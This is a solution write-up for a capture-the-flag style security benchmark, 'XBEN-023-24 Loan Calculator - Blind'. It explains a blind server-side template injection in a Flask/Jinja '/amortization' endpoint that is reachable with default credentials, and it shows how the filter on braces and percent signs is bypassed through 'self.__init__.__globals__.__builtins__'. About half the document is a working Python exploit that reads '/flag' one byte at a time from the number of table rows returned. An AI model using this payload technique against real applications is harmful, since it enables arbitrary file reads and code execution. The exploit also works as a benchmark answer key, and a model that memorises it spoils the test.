# XBEN-023-24 — Loan Calculator - Blind

> **Live PoC:** Start the benchmark with `make run`, then run `make poc` from its benchmark directory. The runner discovers the current published port and prints only the flag recovered from the running service.

**Vuln class:** Default credentials -> Blind Server-Side Template Injection (SSTI) in the `term` parameter of `/amortization`, exfiltrated without ever seeing direct command output (only the number of `<tr>` rows rendered is observable).

## Root cause

`app/website/app/routes.py`, `/amortization`:

```python
term = request.args.get('term', type=str)
if "{" in term or "}" in term or "%" in term:
    return Response('GET parameter `term` contains forbidden characters.', status=400)
table_template = f"""
...
{{% for row in range({term}) %}}
    <tr><td>{{{{ row+1 }}}}</td>...</tr>
{{% endfor %}}
...
"""
return render_template_string(table_template)
```

`term` is substituted **unescaped** as the argument to Jinja's `range(...)` inside `{% for %}`. The endpoint blocks `{`, `}`, `%` (blocking new Jinja tags/braces), but the existing `range(...)` call already gives us a live Jinja *expression* context, and Jinja expressions don't need braces/`%` internally — dots, calls, `[]`, and string literals are all still allowed. This lets us reach `self.__init__.__globals__.__builtins__` (the `self` TemplateReference is auto-injected by Jinja) to call arbitrary builtins such as `open()` and `ord()`.

Since the output is only ever used as `range(N)` (how many `<tr>` rows get rendered), there's no direct text reflection of command output — it's a blind primitive. But by requesting `range(ord(open('/flag').read()[i]))` for each index `i`, the resulting row count directly encodes `ord(flag[i])`, so the exact flag byte can be read off from `(number_of_<tr>_elements - 1)` for the header row.

## Exploit

```python
# /tmp/xben023_exfil.py
import requests, re

PORT = <PORT>   # from docker compose port, e.g. 62209
BASE = f"http://localhost:{PORT}"
s = requests.Session()
s.post(f"{BASE}/login", data={"username": "test", "password": "test"})  # default creds

flag_chars = []
i = 0
while True:
    payload = (f"self.__init__.__globals__.__builtins__.ord("
               f"self.__init__.__globals__.__builtins__.open('/flag').read()[{i}])")
    r = s.get(f"{BASE}/amortization", params={"term": payload})
    rows = len(re.findall(r'<tr>', r.text))
    if rows == 0:
        break                      # IndexError past end of file -> exception page
    code = rows - 1                # subtract the <thead> header <tr>
    ch = chr(code)
    flag_chars.append(ch)
    print(i, repr(ch))
    i += 1
    if ch == '}':
        break

print("FLAG:", ''.join(flag_chars))
```
